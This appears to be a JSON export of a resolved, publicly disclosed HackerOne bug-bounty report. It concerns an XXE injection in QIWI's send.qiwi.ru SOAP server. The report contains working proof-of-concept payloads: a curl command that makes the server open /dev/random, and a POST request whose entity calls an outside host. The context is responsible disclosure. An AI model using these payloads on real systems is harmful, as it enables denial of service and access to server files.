{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2014-11-18T15:05:35.325Z", 
    "voters": [
        "mik317", 
        "bogdantcaciuc", 
        "almaco", 
        "khoata", 
        "silv3rpoision", 
        "ghoibsec", 
        "lovethembytes", 
        "spetr0x"
    ], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "1000.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 36450, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "[send.qiwi.ru] Soap-based XXE vulnerability /soapserver/ ", 
    "is_member_of_team?": null, 
    "vote_count": 8, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2014-12-18T15:05:35.635Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$1,000", 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2014-11-17T22:39:30.291Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-11-17T22:39:30.291Z", 
            "actor": {
                "username": "bitquark", 
                "url": "/bitquark", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/068/8f60b6f64a854fe0bbe5de42ccb8bf49719a2afe_medium.jpeg?1432170702"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "qiwi", 
            "message": "Here's a quick cURL proof-of-concept which makes the script open /dev/random and hang:\n\ncurl -is --data $'<?xml version=\\\"1.0\\\" encoding=\\\"UTF-8\\\"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM \\\"file:///dev/random\\\">]><SOAP-ENV:Envelope><SOAP-ENV:Body><getStatus><id>&xxe;</id></getStatus></SOAP-ENV:Body></SOAP-ENV:Envelope>' https://send.qiwi.ru/soapserver/", 
            "markdown_message": "<p>Here&#39;s a quick cURL proof-of-concept which makes the script open /dev/random and hang:</p>\n\n<p>curl -is --data $&#39;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;UTF-8\\&quot;?&gt;&lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;&lt;!ENTITY xxe SYSTEM \\&quot;file:///dev/random\\&quot;&gt;]&gt;soap-env:Envelopesoap-env:Body&lt;getStatus&gt;&lt;id&gt;&amp;xxe;&lt;/id&gt;&lt;/getStatus&gt;<a title=\"/SOAP-ENV:Body\" href=\"/SOAP-ENV:Body\">/SOAP-ENV:Body</a><a title=\"/SOAP-ENV:Envelope\" href=\"/SOAP-ENV:Envelope\">/SOAP-ENV:Envelope</a>&#39; <a title=\"https://send.qiwi.ru/soapserver/\" href=\"/redirect?signature=5d30639cfed08f484b62552c0a704f41f02e12da&amp;url=https%3A%2F%2Fsend.qiwi.ru%2Fsoapserver%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://send.qiwi.ru/soapserver/</span><i class=\"icon-external-link\"></i></a></p>\n", 
            "type": "Activities::Comment", 
            "id": 162854, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-11-18T10:45:22.124Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-11-18T10:45:22.124Z", 
            "actor": {
                "username": "videns", 
                "url": "/videns", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "additional_data": {
                "new_title": "[send.qiwi.ru] Soap-based XXE vulnerability /soapserver/ ", 
                "old_title": "Soap-based XXE vulnerability on send.qiwi.ru"
            }, 
            "team_handle": "qiwi", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportTitleUpdated", 
            "id": 163432, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-11-18T10:49:46.489Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-11-18T10:49:46.489Z", 
            "actor": {
                "username": "videns", 
                "url": "/videns", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "qiwi", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugTriaged", 
            "id": 163436, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "bitquark", 
                "url": "/bitquark"
            }, 
            "created_at": "2014-11-18T12:00:39.381Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-11-18T12:00:39.381Z", 
            "actor": {
                "username": "isox", 
                "url": "/isox", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/006/507/4c70495207cbad190b74a41d1fd530a86ca53bc1_medium.png?1400926274"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "qiwi", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 163492, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2014-11-18T12:03:00.525Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-11-18T12:03:00.525Z", 
            "actor": {
                "url": "/qiwi", 
                "profile": {
                    "name": "QIWI"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/215/8e2cf926d9711c2f3fde4f4a97009c320375ced0_medium.png?1415704940"
                }
            }, 
            "team_handle": "qiwi", 
            "bounty_amount": "1000.0", 
            "collaborator": {
                "username": "bitquark", 
                "url": "/bitquark"
            }, 
            "message": "Thank's, that's a good bug :)", 
            "markdown_message": "<p>Thank&#39;s, that&#39;s a good bug :)</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 163496, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-11-18T13:00:55.238Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-11-18T13:00:55.238Z", 
            "actor": {
                "username": "bitquark", 
                "url": "/bitquark", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/068/8f60b6f64a854fe0bbe5de42ccb8bf49719a2afe_medium.jpeg?1432170702"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "qiwi", 
            "message": "Fix confirmed, thanks for the super quick response and reward! :-)", 
            "markdown_message": "<p>Fix confirmed, thanks for the super quick response and reward! :-)</p>\n", 
            "type": "Activities::Comment", 
            "id": 163551, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-11-18T15:05:35.341Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-11-18T15:05:35.341Z", 
            "actor": {
                "username": "bitquark", 
                "url": "/bitquark", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/068/8f60b6f64a854fe0bbe5de42ccb8bf49719a2afe_medium.jpeg?1432170702"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "qiwi", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 163695, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-12-18T15:05:45.409Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-12-18T15:05:45.409Z", 
            "actor": {
                "url": "/qiwi", 
                "profile": {
                    "name": "QIWI"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/215/8e2cf926d9711c2f3fde4f4a97009c320375ced0_medium.png?1415704940"
                }
            }, 
            "team_handle": "qiwi", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 183098, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "bitquark", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/bitquark", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/068/51811ea999c023fbd60e08fa813090a025fe1e93_small.jpeg?1432170702"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 48, 
        "name": "Denial of Service"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -125222218.64641967, 
    "disclosed_at": "2014-12-18T15:05:45.315Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/36450", 
    "created_at": "2014-11-17T22:31:53.825Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>An XML external entities injection vulnerability exists on the soap server hosted on send.qiwi.ru. The attack allows an attacker to open local files (although perhaps not return the data, see below), leading at best to a DoS.</p>\n\n<p>Often this attack can be used to extract files from the server (such as /etc/passwd), or even directly execute code if the PHP expect module is installed, however in this case exploitation isn&#39;t as straight forward as the issue occurs in the XML pre-check code and no user input is returned. That&#39;s not to say there isn&#39;t a away to exfiltrate data, but I haven&#39;t had time to fully investigate.</p>\n\n<p>At best, this attack can be used as a denial-of-service, opening up /dev/random thousands of times until the server falls over through memory use and CPU load.</p>\n\n<p>Proof-of-concept (change bitquark.co.uk to a site you control and watch the access logs; or change to file:///dev/urandom and the script will hang):</p>\n<pre class=\"highlight plaintext\"><code>POST /soapserver/ HTTP/1.1\nHost: send.qiwi.ru\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 254\n\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE aa[&lt;!ELEMENT bb ANY&gt;&lt;!ENTITY xxe SYSTEM &quot;https://bitquark.co.uk/?xxe&quot;&gt;]&gt;\n&lt;SOAP-ENV:Envelope&gt;\n  &lt;SOAP-ENV:Body&gt;\n    &lt;getStatus&gt;\n    &lt;id&gt;&amp;xxe;&lt;/id&gt;\n    &lt;/getStatus&gt;\n  &lt;/SOAP-ENV:Body&gt;\n&lt;/SOAP-ENV:Envelope&gt;\n</code></pre>\n<p>You&#39;ll get the error &quot;DTD are not supported by SOAP&quot;, but the attack will have succeeded.</p>\n\n<p>For more information on XXE vulnerabilities in PHP in particular, see:</p>\n\n<p><a title=\"http://phpsecurity.readthedocs.org/en/latest/Injection-Attacks.html#xml-external-entity-injection\" href=\"/redirect?signature=c723f8d3fb1c3b32b205ebb39864c6ca614ec13d&amp;url=http%3A%2F%2Fphpsecurity.readthedocs.org%2Fen%2Flatest%2FInjection-Attacks.html%23xml-external-entity-injection\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://phpsecurity.readthedocs.org/en/latest/Injection-Attacks.html#xml-external-entity-injection</span><i class=\"icon-external-link\"></i></a></p>\n", 
    "vulnerability_information": "An XML external entities injection vulnerability exists on the soap server hosted on send.qiwi.ru. The attack allows an attacker to open local files (although perhaps not return the data, see below), leading at best to a DoS.\r\n\r\nOften this attack can be used to extract files from the server (such as /etc/passwd), or even directly execute code if the PHP expect module is installed, however in this case exploitation isn't as straight forward as the issue occurs in the XML pre-check code and no user input is returned. That's not to say there isn't a away to exfiltrate data, but I haven't had time to fully investigate.\r\n\r\nAt best, this attack can be used as a denial-of-service, opening up /dev/random thousands of times until the server falls over through memory use and CPU load.\r\n\r\nProof-of-concept (change bitquark.co.uk to a site you control and watch the access logs; or change to file:///dev/urandom and the script will hang):\r\n\r\n    POST /soapserver/ HTTP/1.1\r\n    Host: send.qiwi.ru\r\n    Content-Type: application/x-www-form-urlencoded\r\n    Content-Length: 254\r\n\r\n    <?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE aa[<!ELEMENT bb ANY><!ENTITY xxe SYSTEM \"https://bitquark.co.uk/?xxe\">]>\r\n    <SOAP-ENV:Envelope>\r\n      <SOAP-ENV:Body>\r\n        <getStatus>\r\n\t    <id>&xxe;</id>\r\n        </getStatus>\r\n      </SOAP-ENV:Body>\r\n    </SOAP-ENV:Envelope>\r\n\r\nYou'll get the error \"DTD are not supported by SOAP\", but the attack will have succeeded.\r\n\r\nFor more information on XXE vulnerabilities in PHP in particular, see:\r\n\r\nhttp://phpsecurity.readthedocs.org/en/latest/Injection-Attacks.html#xml-external-entity-injection", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://qiwi.com", 
            "about": "The QIWI brand is a family brand that consolidates several directions: kiosks, wallet, bank and even terminals of goods delivery.", 
            "twitter_handle": "", 
            "name": "QIWI"
        }, 
        "handle": "qiwi", 
        "url": "https://hackerone.com/qiwi", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/215/bb4d4fcfc29579c7e90c05bc75e6486f99b382ff_small.png?1415704940", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/215/8e2cf926d9711c2f3fde4f4a97009c320375ced0_medium.png?1415704940"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 215, 
        "default_currency": "usd"
    }, 
    "is_published": false
}